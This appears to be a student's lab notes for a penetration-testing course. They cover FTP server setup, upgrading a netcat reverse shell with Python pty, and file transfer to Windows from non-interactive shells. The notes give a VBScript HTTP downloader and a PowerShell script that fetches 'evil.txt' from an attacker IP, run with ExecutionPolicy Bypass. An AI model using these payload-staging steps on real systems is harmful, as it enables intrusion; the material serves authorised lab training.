# 16.1.4 Considerations and Preparations
**1.  Start the Pure-FTPd FTP server on your Kali system, connect to it using the FTP client on the Debian lab VM, and observe how the interactive prompt works.**

The following script will create the necessary users and gorups as well as start the FTP service
```bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```


![[systemctl_ftpd.png]]

We can now switch to our Debian client and attempt to connect.
![[frp_connect.png]]


**2.  Attempt to log in to the FTP server from a Netcat reverse shell and see what happens.**

After setting up our listener on the Debian client we can use netcat to connect to our listener. We then use the command "ftp" to attempt to interact with our FTP server running on our Kali machine. This will result in a loss of control of our shell.
![[non-interactive_ftp.png]]

**3.  Research alternative methods to upgrade a non-interactive shell.**

To upgrade our shell we can use the python module "pty" , a standard module that is often used to upgrade to interactive shells. We can see that after upgrading our shell via "pty" we can access the ftp server running on our Kali machine.
![[interactive_ftp.png]]


# 16.2.6 Transferring Files with Windows Hosts

**1.  Use VBScript to transfer files in a non-interactive shell from Kali to Windows.**

We must first write a vbs script which will act like a simple http downloader.
```vbs
strUrl = WScript.Arguments.Item(0)
StrFile = WScript.Arguments.Item(1)
Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1
Const HTTPREQUEST_PROXYSETTING_PROXY = 2
Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts
 Err.Clear
 Set http = Nothing
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
 If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
 If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
 http.Open "GET", strURL, False
 http.Send
 varByteArray = http.ResponseBody
 Set http = Nothing
 Set fs = CreateObject("Scripting.FileSystemObject")
 Set ts = fs.CreateTextFile(StrFile, True)
 strData = ""
 strBuffer = ""
 For lngCounter = 0 to UBound(varByteArray)
 ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))
 Next
 ts.Close
```

We can then run the script with cscript and download files from our Kali machine's server.
![[Pasted image 20220720022641.png]]

**2.  Use PowerShell to transfer files in a non-interactive shell from Kali to Windows and vice versa.**

For more recent versions of Windows a much better approach is to utilize PowerShell. We start by screating the script with the following code.
```
$webclient = New-Object System.Net.WebClient 
$url = "http://192.168.119.130:9002/evil.txt" 
$file = "new-exploit.txt" 
$webclient.DownloadFile($url,$file) 
```

This creates the wget.ps1 script. In order to run the script we must first enable the execution of PowerShell scripts. We can do this with the following command, including a few extra flags to set a few other options.
`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`
And we can see our file has downloaded.
![[Pasted image 20220720024112.png]]


**3.  For PowerShell version 3 and above, which is present by default on Windows 8.1 and Windows 10, the cmdlet [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-6) was added. Try to make use of it in order to perform both upload and download requests to your Kali machine.**


**4.  Use TFTP to transfer files from a non-interactive shell from Kali to Windows.**

**Note:** If you encounter problems, first attempt the transfer process within an interactive shell and watch for issues that may cause problems in a non-interactive shell.